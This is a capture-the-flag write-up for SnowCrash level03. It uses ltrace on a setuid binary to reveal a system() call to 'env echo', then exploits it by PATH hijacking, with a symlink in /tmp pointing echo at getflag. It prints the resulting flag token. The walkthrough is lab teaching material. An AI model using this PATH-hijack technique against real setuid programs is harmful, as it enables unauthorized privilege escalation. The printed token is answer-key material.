in this level when we run ls we found : 
level03@SnowCrash:~$ ls
level03
level03@SnowCrash:~$ ls -la 
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03

so when we run the level03 we get : 
level03@SnowCrash:~$ ./level03 
Exploit me


and when we use ltrace : 
level03@SnowCrash:~$ ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7e4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                          = 2003
geteuid()                                          = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                             = 0
+++ exited (status 0) +++


so we see echo : 
system("/usr/bin/env echo Exploit me"Exploit me


so if we change the behavor of echo to run getflag we get the flag : 
 ln -s /bin/getflag /tmp/echo

and : 

 export PATH=/tmp:$PATH



WHEN WE run ./level03 we get the flag : 

level03@SnowCrash:~$ ./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
